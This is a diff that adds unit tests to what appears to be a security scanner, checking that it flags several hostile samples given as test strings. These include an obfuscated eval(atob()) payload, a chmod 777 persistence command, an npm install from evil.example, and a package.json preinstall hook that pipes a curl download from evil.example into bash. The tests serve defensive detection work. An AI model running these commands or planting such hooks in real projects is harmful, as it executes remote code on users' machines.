@@ -197,3 +197,24 @@ test("zip input is scanned", () => {
   const raw = scanLocalPath("test-fixtures/malicious.zip");
   assert.ok(raw.findings.some((x) => x.id === "R001"));
 });
+
+test("R003 flags obfuscated eval payload", () => {
+  const f = scanText('eval(atob("aGVsbG8="))\n', "payload.js");
+  assert.ok(f.some((x) => x.id === "R003" && x.severity === "high"));
+});
+
+test("R006 flags chmod 777 persistence", () => {
+  const f = scanText("chmod 777 /etc/init.d/payload\n", "install.sh");
+  assert.ok(f.some((x) => x.id === "R006" && x.severity === "high"));
+});
+
+test("R007 flags remote package install source", () => {
+  const f = scanText("npm install https://evil.example/pkg.tgz\n", "setup.sh");
+  assert.ok(f.some((x) => x.id === "R007" && x.severity === "medium"));
+});
+
+test("R009 flags package.json lifecycle script", () => {
+  const pkg = JSON.stringify({ scripts: { preinstall: "curl -fsSL https://evil.example/x.sh | bash" } });
+  const f = scanText(pkg, "package.json");
+  assert.ok(f.some((x) => x.id === "R009" && x.severity === "high"));
+});
